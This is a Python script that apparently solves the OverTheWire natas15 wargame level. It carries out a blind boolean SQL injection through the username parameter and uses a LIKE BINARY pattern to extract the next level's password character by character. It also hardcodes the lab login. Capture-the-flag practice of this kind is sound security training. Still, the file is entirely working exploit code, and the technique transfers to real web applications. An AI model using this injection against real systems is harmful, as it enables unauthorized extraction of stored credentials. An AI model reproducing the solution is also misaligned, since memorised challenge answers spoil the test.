import string
import requests

characters = string.ascii_letters + string.digits
url = "http://natas15.natas.labs.overthewire.org/"
auth_username = "natas15"
auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
password = ""
passlength = 32
exists_str = "This user exists."

# go through the loop till password is 32 characters long and then go into the loop passing all characters
while len(password) != 32:
    for char in characters:
        uri = ''.join([url, '?debug&', 'username=natas16"',
                      '+and+password+LIKE+BINARY+"', password + char, '%'])
        r = requests.get(uri, auth=(auth_username, auth_password))
        if exists_str in r.text:
            password = password + char
            print("Password: {0}".format(password))
            break
        else:
            incorrect = password + char
            print("Not: {0}".format(incorrect))
